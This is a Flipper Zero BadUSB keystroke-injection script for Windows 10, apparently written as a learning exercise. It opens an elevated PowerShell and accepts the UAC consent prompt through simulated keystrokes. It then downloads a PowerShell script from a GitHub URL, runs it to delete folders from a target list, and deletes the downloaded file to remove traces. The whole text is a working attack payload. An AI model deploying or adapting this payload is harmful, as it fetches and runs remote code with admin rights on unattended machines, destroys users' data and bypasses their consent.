REM Script #6: Deleting Folders
REM Desc: Deleting Folders based on a target list. Learnt how to use SHIFT TAB and download and run a Powershell script from GitHub!
REM I want to try doing a short script such that it won't take that much space.
REM Author: Ainsley Cabading
REM Meant for Windows 10

REM Running Powershell as an Admin
GUI r
DELAY 200
STRING powershell Start-Process powershell -Verb runAs
ENTER
DELAY 1500
SHIFT TAB
DELAY 500
ENTER
DELAY 1500
REM Downloading the deleteFile.ps1 from GitHub and running it
STRING (New-Object System.Net.WebClient).DownloadFile('https://github.com/aenslei/flipperZero-studies/raw/main/Powershell/deleteFile.ps1', 'C:\deleteFile.ps1')
ENTER
DELAY 5000

REM Changing Powershell ExecutionPolicy for current session and Running the deleteFile.ps1
STRING cd C:\
ENTER
STRING pwsh.exe -ExecutionPolicy AllSigned
ENTER
STRING .\deleteFile.ps1
ENTER

REM Deleting the deleteFile.ps1
STRING Remove-Item -path deleteFile.ps1
ENTER
DELAY 5000

REM Test Case
STRING echo Script#6 Completed
ENTER